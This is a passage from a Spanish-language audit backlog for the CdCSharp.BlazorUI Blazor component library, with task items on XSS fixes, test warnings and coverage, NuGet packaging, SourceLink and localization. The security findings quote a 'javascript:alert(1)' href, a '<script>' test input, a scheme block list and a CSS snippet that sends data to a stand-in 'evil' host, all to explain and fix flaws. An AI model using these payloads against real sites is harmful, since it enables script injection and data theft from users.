  El XML doc declara "callers are expected to supply trusted SVG markup" — pero `Icon` es parámetro público. Un consumer que pase `BUISvgIcon Icon="@userSubmittedSvg"` crea XSS.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-14]** Opción A: cambiar `Icon` a aceptar sólo identificadores de un **catálogo cerrado** (`IconKey` struct/enum strongly-typed generado desde Material Icons u otro set). Nueva API: `<BUISvgIcon Icon="IconKey.Home" />`. No se acepta string arbitrario.
  2. Retirar el parámetro `string Icon` de `BUISvgIcon` (breaking change — documentar en release notes). Aquí `MaterialIconsScrapper` puede alimentar el catálogo pre-compilado.
  3. `SvgMarkupSanitizer` pasa a `internal sealed class` como fallback defensivo del framework (p. ej. si algún otro consumidor embebe SVG parseado). Se documenta explícitamente: "no es barrera de seguridad, es higiene mínima; el framework solo acepta SVG de catálogo cerrado".
  4. Tests: intentar pasar `Icon="<script>"` al componente → error de compilación (tipado fuerte) o runtime (si se mantiene algún path string).
  5. Documentar en CLAUDE.md + docs site la filosofía: "no arbitrary SVG input por diseño".
- **Notas**: cruza con `API-xx` sobre superficie pública `Icon`. Decisión D-14 (ver §Directivas de diseño): catálogo cerrado confirmado, `SvgMarkupSanitizer` retirado de la superficie pública.

### `SEC-03` — `BUITreeMenu` renderiza `href="@node.Navigation.Href"` sin validar scheme: `javascript:` URIs posibles

- **Estado**: ✅ Resuelto (commit `6afdfa8`) — `NavigationInfo.HasNavigation` ahora delega en `IsSafeHref(Href)`: whitelist `http`/`https`/`mailto`/`tel` + relativos (`/`, `./`, `../`, `#`, `?`, sin scheme). `javascript:`, `vbscript:`, `data:`, `file:`, `ftp:` caen al fallback silencioso (el razor renderiza el branch `<button>` sin link). 21 tests en `NavigationInfoTests.cs`. Criterio 4 (audit): grep `href="@` en `src/**/*.razor` → sólo `BUITreeMenu.razor:255`, ningún otro componente emite href dinámico.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Tree/TreeMenu/BUITreeMenu.razor:256`.
- **Evidencia**: `<a href="@node.Navigation.Href" ...>` — Blazor hace HTML-encoding del valor pero **no** valida el scheme. Si `node.Navigation.Href == "javascript:alert(1)"`, el `<a>` resulta en un enlace con scheme javascript que ejecuta al click. Risk: consumer pasa datos desde fuente untrusted (CMS, respuesta API) directamente al tree. Mismo problema potencial en cualquier otro componente que emita `href` dinámico (auditar).
- **Criterios de aceptación**:
  1. Validar scheme en el modelo `TreeMenuNode.Navigation.Href` setter: whitelist `http|https|mailto|tel|/|./|../` o `Uri.TryCreate` con `UriKind.RelativeOrAbsolute`.
  2. Si scheme no permitido → tirar `ArgumentException` (escalada visible al consumer) o renderizar como texto plano (silent fallback — peor UX pero más seguro por defecto).
  3. Tests: node con `Href="javascript:..."` → verificar que el DOM final no contiene el scheme.
  4. Auditar otros componentes: `BUIButton` no tiene href nativo, pero verificar `_BUIBtn`/`BUIChip`/cualquier componente con link.
- **Notas**: afecta a consumidores con datos untrusted; documentar el contrato "Href debe estar pre-validado" si se opta por A.

### `SEC-04` — `localStorage['blazorui-theme']` sin validación: CSS selector injection vía atacante con escritura a localStorage

- **Estado**: ✅ Resuelto (commit `3c29682`) — sanitización regex `^[a-zA-Z0-9_-]{1,32}$` aplicada en `ThemeInterop.ts` (`initialize`, `setTheme`) y en el inline script de `BUIInitializer.razor`. Strings con caracteres de CSS-injection (espacios, corchetes, comillas, paréntesis, `:`) caen al fallback. Se evita el whitelist explícito de theme IDs (criterio 1 literal) porque requeriría una API pública nueva (nuevo overload en `IThemeJsInterop`, nuevo `[Parameter]` en `BUIInitializer`) en conflicto con el WIP de baseline de PublicAPI. El objetivo de seguridad se cumple igualmente: cualquier valor con chars CSS-significativos queda bloqueado antes de tocar el DOM. Whitelist estricto puede reintroducirse junto a `SEC-01` (eliminación del inline script).
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/BUIInitializer.razor:11-14` (inline script); `src/CdCSharp.BlazorUI/Types/Theme/ThemeInterop.ts:10-20`.
- **Evidencia**: ambos caminos leen `localStorage.getItem('blazorui-theme')` y lo asignan directamente a `document.documentElement.setAttribute('data-theme', savedTheme)`. Si un atacante con XSS previo en la app consumer (o una extensión del navegador, u otro script en mismo origen) escribe arbitrariamente a esa clave, el valor acaba como selector de atributo. CSS selectors pueden exfiltrar atributos (`[data-secret]::before { background: url('https://evil?x='+...) }`), aunque `data-theme` está bajo control de la librería. Impacto limitado a CSS, pero el principio es: no asignar a la DOM valores de storage no validados.
- **Criterios de aceptación**:
  1. Validar `savedTheme` contra whitelist de IDs registrados en el `ThemeService` (los `Id`s de `BUIThemePaletteBase` instances registradas).
  2. Si valor no reconocido, fallback al default sin escribir nada.
  3. Aplicar mismo check en el inline script (posiblemente pasando la whitelist como JSON embebido por el servidor).
- **Notas**: relacionado con `SEC-01` (si eliminamos el inline script, este fix se mueve íntegramente a TypeScript).

### `TEST-01` — Proyecto `CdCSharp.BlazorUI.Tests.Integration` acumula ~203 warnings únicos (406 en log): ruido que oculta regresiones reales

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/**/*.cs`; `test/CdCSharp.BlazorUI.Tests.Integration/*.csproj`.
- **Evidencia**: baseline de §3.0: "Warnings test/CdCSharp.BlazorUI.Tests.Integration: ~203 únicos (406 dup. en log)". Un warning-log de tests que duplica los de `src/` significa que un warning nuevo genuino (nullability, obsolete API, CS0618) queda camuflado. Además bloquea adoptar `TreatWarningsAsErrors` en `src/`.
- **Criterios de aceptación**:
  1. Clasificar los 203 por diagnóstico (`dotnet build /p:WarningLevel=4` + parse).
  2. Resolver por categoría (nullability, xUnit2013 `Assert.Equal<int>`, xUnit1031 `.Wait()`, CA1822 static, CS1998 async-without-await).
  3. Activar `<TreatWarningsAsErrors>true</TreatWarningsAsErrors>` en el `.csproj` de tests; mantener `<NoWarn>` sólo para categorías con justificación documentada en `Directory.Build.props`.
  4. Documentar en `CLAUDE.md §Testing` los `NoWarn` permitidos.
- **Notas**: bloquea `CI-xx` (gate de warnings). Probable solapamiento con `BLD-xx` global de warnings en `src/`.

### `TEST-02` — Cobertura (líneas/ramas) sin baseline ni gate CI: no hay número que defender en release

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `Test-Coverage.ps1`; `.github/workflows/publish.yml`.
- **Evidencia**: §3.0 línea "Cobertura (líneas/ramas): pendiente". El script `Test-Coverage.ps1` genera reporte localmente (ReportGenerator → `ReporteFinalCobertura/index.html`) pero **no** se ejecuta en CI ni publica umbral. Sin baseline no hay criterio de "release gate" para §3.24 `REL`.
- **Criterios de aceptación**:
  1. Ejecutar `Test-Coverage.ps1` en local y capturar LINES/BRANCH para `CdCSharp.BlazorUI` y `CdCSharp.BlazorUI.Core` (registrar en §3.0 baseline de `TASKS.md`).
  2. Definir umbrales mínimos por proyecto: p.ej. `Core ≥ 85% líneas / 75% ramas`, `BlazorUI ≥ 70% líneas / 60% ramas` (ajustar a la baseline real).
  3. Añadir step en `publish.yml` que invoque `dotnet test --collect` + ReportGenerator + check de umbral (`ReportGenerator` soporta `assemblyfilters` y `threshold`).
  4. Documentar umbrales en `CLAUDE.md §Testing → Coverage`.
- **Notas**: dependencia con `CI-xx`. `TEST-10` (Polish) profundiza con branch coverage por feature.

### `TEST-03` — Matriz estándar de 6 archivos por componente incompleta: gaps en ≥ 18 componentes

- **Severidad**: Major
- **Esfuerzo**: L
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/**`.
- **Evidencia**: enumeración por carpeta vs. estándar CLAUDE.md (Rendering, State, Interaction, Variants, Accessibility, Snapshots):

  | Componente | Gaps |
  |---|---|
  | `BUIBadge` | Interaction (pasivo — documentar) |
  | `BUINotificationBadge` | Variants |
  | `BUIBlazorLayout` | Interaction, Variants, Accessibility |
  | `BUIDataColumn` | Variants, Accessibility, Snapshots |
  | `BUIDataGrid` | Variants, Snapshots |
  | `BUIDrawer` | Accessibility, Snapshots, Variants |
  | `BUIModalContainer` | State, Interaction, Variants, Accessibility, Snapshots |
  | `BUIModalHost` | State, Variants, Accessibility, Snapshots |
  | `BUIGrid` | Interaction, Variants |
  | `BUIGridItem` | State, Interaction, Variants, Accessibility, Snapshots |
  | `BUIInitializer` | State, Variants, Accessibility, Snapshots |
  | `BUILoadingIndicator` | Interaction (pasivo — documentar) |
  | `BUIInputRadio` | Interaction, Accessibility, Validation, Variants |
  | `BUISvgIcon` | Interaction, Accessibility |
  | `BUISwitch` | Variants (si aplica) |
  | `BUIThemeEditor` | Accessibility, Variants |
  | `BUIThemePreview` | Interaction, Accessibility, Variants |
  | `BUIToastHost` | State, Variants, Accessibility, Snapshots |

- **Criterios de aceptación**:
  1. Por cada fila, **o** crear el archivo faltante con mínimo un test `Should_...`, **o** documentar por qué no aplica en `CLAUDE.md §Testing → Excepciones de la matriz` (ejemplo: `BUIBadge` es pasivo sin callback → no Interaction).
  2. Los archivos nuevos deben seguir el template (xunit `[Trait]` en la clase, `[Theory]` + `TestScenarios.All`, `await using BlazorTestContextBase ctx`).
  3. Actualizar `CLAUDE.md` con la lista de excepciones justificadas.
- **Notas**: divide en sub-tareas `TEST-COMP-<name>` al ejecutar F2 para trackear progreso. Algunas "internas" (`_BUIFieldHelper`, `_BUIInputLoading`, `_BUIInputOutline`, `_BUIInputPrefix`, `_BUIInputSuffix`) están cubiertas sólo en Rendering — ver `TEST-08` Minor.

### `TEST-04` — `*.received.txt` committed en el repo: snapshot drift no resuelto en `BUICultureSelector` (Wasm)

- **Estado**: ✅ Resuelto (commit `c05f822`) — los 2 `.received.txt` ya no existen en el árbol (cerrados colateralmente por `BLD-01`, commit `5f6604e`, que regeneró los `.verified.txt` del `BUICultureSelector` en Wasm). Añadido pattern `*.received.*` a `.gitignore` raíz para impedir reaparición. Criterio 3-CI (step que falle si detecta `*.received.*`) queda como follow-up menor — el `.gitignore` cubre el vector principal (commit accidental).
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/CultureSelector/BUICultureSelectorSnapshotTests.Should_Match_Flags_Snapshot_scenario=Wasm.received.txt`, `...Should_Match_Dropdown_Snapshot_scenario=Wasm.received.txt`.
- **Evidencia**: `find test -name '*.received.txt'` → 2 ficheros. Verify convention: `*.received.txt` indica tests que **divergieron** del `*.verified.txt` y el diff no fue aceptado. Estos ficheros **no** deben existir en el repo; su presencia indica que los 3 tests fallando de `BLD-01` (`BUICultureSelector` Wasm) dejaron basura snapshot no limpiada.
- **Criterios de aceptación**:
  1. Investigar el diff real (diff `.received` vs `.verified`).
  2. Resolver en conjunto con `BLD-01` (renombrar `.received.txt` → `.verified.txt` si el nuevo markup es correcto, o corregir el componente si el anterior era el bueno).
  3. Añadir pattern `*.received.*` a `.gitignore` **global** para evitar commits accidentales; y/o step CI que falle si detecta `*.received.*` en el árbol.
- **Notas**: dependencia dura con `BLD-01`. Una vez cerrado, este task es trivial.

### `DOC-01` — `README.md` del repo tiene 10 bytes (`# BlazorUI`): NuGet sin overview, onboarding inexistente

- **Estado**: ✅ Resuelto (commit `05a1988`) — README reescrito (~3.9 KB, antes 10 bytes → 1.7 KB parcial con sólo localización). Ahora contiene: 3 badges (NuGet version, CI build, MIT license), overview (una línea sobre el pipeline `data-bui-*`), **Quickstart** (install + `AddBlazorUI()` + `<BUIInitializer />` + ejemplo de 3 componentes), tabla de los 7 paquetes (incluye `FluentValidation` tras CI-01), sección existente Server vs. WASM para localización, Documentation (apunta al docs site WASM), Contributing (flujo de PR + referencia a AGENTS.md + global.json), y License. Criterio 2 (empaquetado NuGet) ya estaba cubierto por `Directory.Build.props` (`<PackageReadmeFile>README.md</PackageReadmeFile>` + `<None Include="$(MSBuildThisFileDirectory)README.md" Pack="true" PackagePath="\" />` condicional a `IsPackable=true`). Criterio 3 verificado empíricamente: `dotnet pack -c Release` produce `.nupkg` con `README.md` en la raíz (3993 bytes). REL-05 queda colateralmente cerrado (síntoma duplicado).
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `README.md`; `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj` (`<PackageReadmeFile>` pendiente).
- **Evidencia**: `ls -la README.md` → 10 bytes; contenido `# BlazorUI`. Un paquete NuGet con `Version 1.0.0` (ver `.csproj:10`) sin README es un anti-pattern: nuget.org renderiza vacío, GitHub landing page no vende el proyecto, y usuarios abren issues preguntando "cómo se usa".
- **Criterios de aceptación**:
  1. README con secciones: overview (qué es, qué no es), badges (build, nuget, license), quickstart (`dotnet add package CdCSharp.BlazorUI` + `AddBlazorUI()` + `<BUIInitializer />`), ejemplos mínimos (1 componente Server + 1 Wasm), link a docs site, license, contribución.
  2. Empaquetado en el NuGet via `<PackageReadmeFile>README.md</PackageReadmeFile>` en el `.csproj` + `<None Include="../../README.md" Pack="true" PackagePath="\" />`.
  3. Verificar en nuget.org preview (se puede renderizar localmente con `dotnet pack` + inspección del `.nupkg`).
- **Notas**: dependencia con `DOC-03` (metadata de csproj) y `DOCS-WASM-xx` (link al docs site).

### `DOC-02` — `GenerateDocumentationFile` no activado; ~710 `[Parameter]` mayoritariamente sin `<summary>`: Intellisense vacío para consumers

- **Severidad**: Major
- **Esfuerzo**: XL
- **Alcance**: `src/CdCSharp.BlazorUI/*.csproj`, `src/CdCSharp.BlazorUI.Core/*.csproj`, `src/CdCSharp.BlazorUI.SyntaxHighlight/*.csproj`, `src/CdCSharp.BlazorUI.Localization.{Server,Wasm}/*.csproj`; componentes bajo `src/CdCSharp.BlazorUI/Components/**`.
- **Evidencia**:
  - `grep -n 'GenerateDocumentationFile' src/` → 0 hits (ningún csproj lo activa).
  - `grep -c '\[Parameter\]' src/CdCSharp.BlazorUI` → **710** atributos en **62** ficheros.
  - `grep -c '/// <summary>' src/CdCSharp.BlazorUI` → **31** ocurrencias en **7** ficheros (< 5% cobertura).
  - `grep -c '/// <summary>' src/CdCSharp.BlazorUI.Core` → **93** ocurrencias en **8** ficheros de 66 `.cs` totales.
  - `grep -c '/// <example>' src/` → **2** (sólo en `ServiceCollectionExtensions`).
- **Criterios de aceptación**:
  1. Añadir `<GenerateDocumentationFile>true</GenerateDocumentationFile>` y `<NoWarn>$(NoWarn);CS1591</NoWarn>` **sólo transitorio** a los 5 csproj empaquetados.
  2. Redactar `<summary>` para cada `[Parameter]` público en todos los componentes `BUI*` (excluir `_BUI*` internos si se declaran `internal`). Priorizar en orden: `BUIButton`, `BUIInputText`, `BUIInputDropdown`, `BUIDialog`, `BUIDataGrid` (top visibilidad).
  3. Retirar `CS1591` del `NoWarn` al llegar a 0 warnings; `TreatWarningsAsErrors` puede activarse después.
  4. Registrar progreso con contador en `TASKS.md §Baseline` (% de parámetros documentados).
- **Notas**: largo; divide por componente en F2 (`DOC-BUIButton`, `DOC-BUIInputText`, …). Dependencia con `DOC-05` (docs site páginas) — mismo texto debe coincidir.

### `DOC-03` — `CdCSharp.BlazorUI.csproj` carece de metadata NuGet completa: `<Description>` placeholder, sin `ProjectUrl`/`RepositoryUrl`/`License`/`Icon`

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj`; equivalente en `Core`, `SyntaxHighlight`, `Localization.{Server,Wasm}`.
- **Evidencia**:
  ```xml
  <Description>Librería de componentes Blazor</Description>
  <PackageTags>blazor;components;ui</PackageTags>
  <Version>1.0.0</Version>
  ```
  Faltan: `<PackageProjectUrl>`, `<RepositoryUrl>`, `<RepositoryType>`, `<PackageLicenseFile>` (o `<PackageLicenseExpression>MIT</PackageLicenseExpression>`), `<PackageIcon>`, `<PackageReadmeFile>`, `<Copyright>`, `<PackageReleaseNotes>`. Además `<Description>` está en español (ver `DOC-06` para la política de idioma).
- **Criterios de aceptación**:
  1. Añadir campos a los 5 csproj empaquetados (idealmente vía `Directory.Build.props` compartido para no duplicar).
  2. `<PackageIcon>icon.png</PackageIcon>` + assets en `/assets/icon.png` + `<None Include="...\assets\icon.png" Pack="true" PackagePath="" />`.
  3. `<PackageLicenseFile>LICENSE.txt</PackageLicenseFile>` (ya existe `LICENSE.txt` de 1090 bytes) + item pack.
  4. `<RepositoryUrl>https://github.com/<owner>/<repo></RepositoryUrl>` + `<RepositoryType>git</RepositoryType>`.
  5. Verificar con `dotnet pack` + inspeccionar `.nuspec` generado.
- **Notas**: dependencia con `DOC-01` (`PackageReadmeFile`). Cross-check con `PKG-xx` (empaquetado).

### `DOC-04` — `CHANGELOG.md` ausente: releases sin trazabilidad; contradice `PackageReleaseNotes` esperado

- **Estado**: ✅ Resuelto (cerrado colateralmente por `REL-02`, commit `9f1ee98`) — duplicado del mismo síntoma. Ver REL-02 para detalle del extractor de release notes en `release-publish.yml`. `<PackageReleaseNotes>` automático MSBuild queda fuera de scope: el `body_path` del release de GitHub ya rellena la trazabilidad pública; añadir el campo a `Directory.Build.props` requeriría duplicar la extracción en `dotnet pack` y no aporta valor sobre lo que el `.nupkg` ya muestra a través del README + GitHub release link.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: nuevo `CHANGELOG.md` en raíz.
- **Evidencia**: `ls CHANGELOG.md` → no existe. El workflow `publish.yml` crea GitHub releases al tag `vX.Y.Z` pero no hay fuente histórica de cambios; los consumers del paquete NuGet no pueden saber qué hay nuevo.
- **Criterios de aceptación**:
  1. `CHANGELOG.md` formato [Keep a Changelog](https://keepachangelog.com/) con secciones `## [Unreleased]`, `## [1.0.0] - YYYY-MM-DD`.
  2. Sección `## [Unreleased]` se actualiza con cada PR relevante (ver `CI-xx` para gate automático).
  3. `publish.yml` extrae el texto de `[X.Y.Z]` y lo inyecta en `<PackageReleaseNotes>` y en la GitHub release body.
- **Notas**: dependencia con `CI-xx` (automación). Baseline: marcar `1.0.0` cuando §3.24 `REL` cierre.

### `PKG-01` — `dotnet pack` no incluye el source generator `CdCSharp.BlazorUI.CodeGeneration.dll` en `analyzers/dotnet/cs/`: `[AutogenerateCssColors]` no funciona en consumers

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:46`; `src/CdCSharp.BlazorUI.CodeGeneration/CdCSharp.BlazorUI.CodeGeneration.csproj`.
- **Evidencia**: el main `.csproj` referencia el generator con `<ProjectReference ... OutputItemType="Analyzer" ReferenceOutputAssembly="false" />`. Esto funciona **localmente** (el build del main project activa el analyzer) pero cuando se hace `dotnet pack src/CdCSharp.BlazorUI/`, el SDK **no** empaqueta automáticamente la DLL del analyzer en la ruta `analyzers/dotnet/cs/` del `.nupkg`. Consumers instalando el NuGet **no reciben** el source generator → `[AutogenerateCssColors]` no se expande; `[GenerateComponentInfo]` no se expande.
- **Criterios de aceptación**:
  1. Añadir al `.csproj` principal:
     ```xml
     <ItemGroup>
       <None Include="$(OutputPath)\CdCSharp.BlazorUI.CodeGeneration.dll"
             Pack="true" PackagePath="analyzers/dotnet/cs/" Visible="false" />
     </ItemGroup>
     ```
     (y equivalente para `Core.CodeGeneration.dll` si se expone a consumers; hoy lo usa Core internamente — verificar).
  2. Test de empaquetado: `dotnet pack` + `unzip -l .nupkg | grep analyzers` devuelve las DLLs.
  3. Test funcional: proyecto consumer de referencia que aplica `[AutogenerateCssColors]` a una clase; compilar tras `dotnet add package`; verificar clases parciales generadas.
- **Notas**: bug crítico de distribución (feature principal del paquete no llega). Dependencia con `ARCH-03` (los dos son el mismo síndrome: empaquetado incompleto). Si se ha publicado alguna preview a nuget.org, marcarla `listed=false`.

### `PKG-02` — SourceLink no configurado: consumers no pueden hacer step-into al código fuente desde el debugger

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `Directory.Build.props` (nuevo, ver `ARCH-05`); los 5 csproj publicables.
- **Evidencia**: `grep 'SourceLink\|EmbedUntrackedSources\|ContinuousIntegrationBuild'` en `src/` → 0 hits. Sin `Microsoft.SourceLink.GitHub` + `<PublishRepositoryUrl>true</PublishRepositoryUrl>` + `<EmbedUntrackedSources>true</EmbedUntrackedSources>` + `<ContinuousIntegrationBuild>true</ContinuousIntegrationBuild>` (CI), los `.pdb` apuntan a rutas locales de la máquina de build (`V:\Work\CdCSharp\...`), y nuget.org Source Browser no indexa los símbolos.
- **Criterios de aceptación**:
  1. Añadir a `Directory.Build.props`:
     ```xml
     <PropertyGroup>
       <PublishRepositoryUrl>true</PublishRepositoryUrl>
       <EmbedUntrackedSources>true</EmbedUntrackedSources>
       <IncludeSymbols>true</IncludeSymbols>
       <SymbolPackageFormat>snupkg</SymbolPackageFormat>
       <ContinuousIntegrationBuild Condition="'$(GITHUB_ACTIONS)' == 'true'">true</ContinuousIntegrationBuild>
     </PropertyGroup>
     <ItemGroup>
       <PackageReference Include="Microsoft.SourceLink.GitHub" Version="8.0.0" PrivateAssets="all" />
     </ItemGroup>
     ```
  2. Quitar `--no-symbols` de `publish.yml:234` y publicar `.snupkg` con `dotnet nuget push *.snupkg -k $SYMBOLS_KEY` (o al mismo nuget.org con la misma key).
  3. Verificar con `dotnet sourcelink test CdCSharp.BlazorUI.1.0.0.nupkg` (herramienta `dotnet-sourcelink` global tool).
- **Notas**: pareja con `ARCH-08` (símbolos). `SourceLink` resuelve DIAGNOSTICS — sin él, excepciones del paquete en stacktrace del consumer sólo muestran nombres de tipo/método sin líneas.

### `PKG-03` — `CdCSharp.BlazorUI.BuildTools` empaquetado como `PackAsTool=true` pero `.targets` usa `$(MSBuildProjectDirectory)\..\BuildTools\bin\...` (path relativo a src/): tool NuGet nunca se invoca

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/CdCSharp.BlazorUI.BuildTools.csproj:8-9`; `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets:6-7,19-27`.
- **Evidencia**:
  ```xml
  <PackAsTool>true</PackAsTool>
  <ToolCommandName>blazorui-buildtools</ToolCommandName>
  ```
  Se publica como **dotnet tool** (se instala con `dotnet tool install -g blazorui-buildtools`). Pero el `.targets` que va en el NuGet `build/` folder invoca el exe desde:
  ```
  $(MSBuildProjectDirectory)\..\CdCSharp.BlazorUI.BuildTools\bin\$(Configuration)\net10.0\*.exe
  ```
  Ese path es válido **sólo** dentro del repo local donde `BuildTools` está como sibling de `BlazorUI`. En un consumer NuGet, ese path resuelve a algo como `<consumer>\..\CdCSharp.BlazorUI.BuildTools\bin\Debug\...` que **no existe**. El `.exe` tampoco está empaquetado dentro del mismo `.nupkg` principal.
- **Criterios de aceptación**:
  1. Decidir modelo: **A**) BuildTools se ejecuta SOLO en tiempo de build de la propia librería (CI), nunca en consumers → quitar `BlazorUIBuildEnabled=true` como default en `.targets` para consumers; el consumer NO necesita BuildTools. **B**) Si se quiere que consumers ejecuten BuildTools, empaquetar el exe dentro del main NuGet en `build/tools/` y apuntar `.targets` ahí.
  2. Documentar en `CLAUDE.md §Build pipeline` la decisión.
  3. `dotnet tool` publication de BuildTools debe ser opcional (para uso CLI manual), no el canal principal.
- **Notas**: hoy funciona "por accidente" porque el `.targets` tiene `Condition="Exists('$(BuildToolsExe)')"` en las `<Exec>` — si no existe, ambos exec se saltan (no-op silencioso). Pero `<EnsureBuildToolsCompiled>` invoca `<MSBuild Projects="$(BuildToolsProject)">` **sin** Exists check → builds de consumer fallan cuando BuildTools no existe en el path esperado. Cross-check con `ARCH-03`.

### `PKG-04` — `dotnet pack` no validado estructuralmente en CI: regresiones de `lib/`, `build/`, `staticwebassets/` pasan sin detección

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `.github/workflows/publish.yml:182-219`; nuevo `test/CdCSharp.BlazorUI.Tests.Pack/` (opcional) o script inline.
- **Evidencia**: la pipeline hace `dotnet pack` → `ls -la ./artifacts/` → `dotnet nuget push` sin ningún assert sobre contenido del `.nupkg`. Cualquier cambio que rompa el layout (p. ej. remover `_build/*.targets` del item group, o cambiar `PackagePath`) no fallaría CI. El `.nupkg` llega roto a nuget.org y afecta a todos los consumers que actualicen.
- **Criterios de aceptación**:
  1. Añadir step post-pack que `unzip` el `.nupkg` y asserta presencia de:
     - `lib/net10.0/CdCSharp.BlazorUI.dll`
     - `lib/net10.0/CdCSharp.BlazorUI.xml` (post `DOC-02`)
     - `build/CdCSharp.BlazorUI.targets`
     - `analyzers/dotnet/cs/CdCSharp.BlazorUI.CodeGeneration.dll` (post `PKG-01`)
     - `staticwebassets/` o equivalente con `wwwroot/css/blazorui.css` y `wwwroot/js/**/*.js`
     - `README.md`, `LICENSE.txt`, `icon.png`
  2. Fail CI si cualquiera está ausente.
  3. Opcional: test unitario `dotnet test` que instancia un consumer real (via `dotnet new blazor` + `dotnet add package` desde `./artifacts`) y verifica compilación + render.
- **Notas**: es el equivalente a `TEST-03` (matriz) pero para packaging. `Meziantou.Framework.NuGetPackageValidation` es una lib con aserts listos.

### `L10N-01` — `BUICultureSelector` duplicado Server/Wasm: ~95% código idéntico, diverge sólo en persistencia + render del dropdown

- **Severidad**: Major
- **Esfuerzo**: L
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Server/Components/BUICultureSelector.razor`; `src/CdCSharp.BlazorUI.Localization.Wasm/Components/BUICultureSelector.razor`; `BUICultureSelectorVariant.cs` (copia en cada lado).
- **Evidencia**: las dos `.razor` tienen ~165 líneas idénticas salvo:
  - Server `SetCultureAsync` hace `Navigation.NavigateTo("Culture/Set?culture=...")` → endpoint server
  - Wasm `SetCultureAsync` hace `LocalizationPersistence.SetStoredCultureAsync(...)` + `NavigateTo(uri)` → localStorage
  - Server `RenderDropdown` usa `<select class="ui-culture-selector__select">` plano
  - Wasm `RenderDropdown` usa `<BUISelect>` (componente de la librería)
  El `GetFlag(...)` switch con 28 entradas se duplica 1:1; el loop sobre `SupportedCultures`, el `OnInitializedAsync`, `BuiltInTemplates` dictionary, y los parámetros (`Size`, `ShowFlag`, `ShowName`, `OnCultureChanged`) son idénticos.
- **Criterios de aceptación**:
  1. Extraer `BUICultureSelectorBase` (o `BUICultureSelector` directo) a `CdCSharp.BlazorUI` core library con un punto de extensión para persistencia: `ICulturePersistenceStrategy.SetCultureAsync(string cultureName) → Task`.
  2. `Localization.Server` inyecta `ServerCulturePersistenceStrategy` (Navigation.NavigateTo a `/Culture/Set`).
  3. `Localization.Wasm` inyecta `WasmCulturePersistenceStrategy` (ILocalizationPersistence → localStorage + reload).
  4. Un único archivo `.razor` para el componente; los dos paquetes sólo exportan `AddBlazorUILocalization*()` extensions y la estrategia.
  5. Tests compartidos en lugar de los `Server_/Wasm_*.cs` duplicados (ver `BLD-01` sobre 3 tests fallando en Wasm).
- **Notas**: prerequisito recomendado para `L10N-02` y `L10N-03`. Reduce el surface area de mantenimiento drásticamente.

### `L10N-02` — Server `BUICultureSelector` usa clases CSS `ui-culture-selector__*`; Wasm usa `bui-culture-selector__*`: contradice la convención `bui-*` de CLAUDE.md

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Server/Components/BUICultureSelector.razor:48,74,78,85`; `.razor.css` en la misma carpeta.
- **Evidencia**:
  ```razor
  <select class="ui-culture-selector__select" ...>
  <div class="ui-culture-selector__flag-list">
  <button class="ui-culture-selector__flag-button ...">
  <span class="ui-culture-selector__flag-label">
  ```
  Wasm version (mismo componente) usa `bui-culture-selector__*`. CLAUDE.md §CSS architecture punto 3 estipula BEM con prefijo `bui-`. El prefix `ui-` es código legacy sin migrar.
- **Criterios de aceptación**:
  1. Renombrar todas las clases `ui-culture-selector__*` → `bui-culture-selector__*` en Server.
  2. Actualizar `.razor.css` correspondiente.
  3. Verificar snapshots (post-`BLD-01` resolución).
- **Notas**: XS fix pero rompe consumers que tengan CSS override con el prefijo viejo — incluir en changelog. Si `L10N-01` se ejecuta primero, este fix se cae solo (un único archivo).

### `L10N-03` — `IStringLocalizer<BUICultureSelector>` inyectado pero nunca usado + ningún `.resx` shipeado con los paquetes: texto visible hardcoded

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.{Server,Wasm}/Components/BUICultureSelector.razor:17`; missing `Resources/BUICultureSelector.{en-US,es-ES,...}.resx`.
- **Evidencia**: `@inject IStringLocalizer<BUICultureSelector> Localizer` declarado en ambas versiones, pero `grep Localizer` dentro del fichero sólo matchea la declaración — jamás se invoca. Los textos visibles (`culture.DisplayName`, los tooltips `title="@culture.DisplayName"`) vienen de `CultureInfo.DisplayName` del .NET runtime, no localizados por la librería.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-17]** Opción B: los componentes con texto visible **deben estar localizados**. Mantener `IStringLocalizer<T>` como mecanismo.
  2. Crear `Resources/BUICultureSelector.resx` (inglés neutral, default) + `BUICultureSelector.es.resx` (español) con keys para: `"SelectLanguage"` (aria-label), `"CurrentLanguage"` ("Current language: {0}"), `"Search"` ("Search…"), y cualquier otro texto hoy hardcoded. Aplicar a **ambas** versiones Server y Wasm del componente.
  3. Empaquetar los `.resx` dentro del NuGet (`<ItemGroup><EmbeddedResource Include="Resources\*.resx" />`) y verificar que `IStringLocalizer<BUICultureSelector>` los resuelve via `ResourceManager` del assembly.
  4. Auditar otros componentes de la librería con texto visible hardcoded (`BUIDataTable` empty state, `BUIDataPagination` labels, `BUIToast` close button aria-label, etc.) y aplicar el mismo patrón: `IStringLocalizer<T>` + `Resources/<ComponentName>.resx`.
  5. Documentar en `CLAUDE.md` + docs WASM el mecanismo: cómo el consumer añade cultura propia, cómo overridea keys individuales, cómo cae el fallback a neutral.
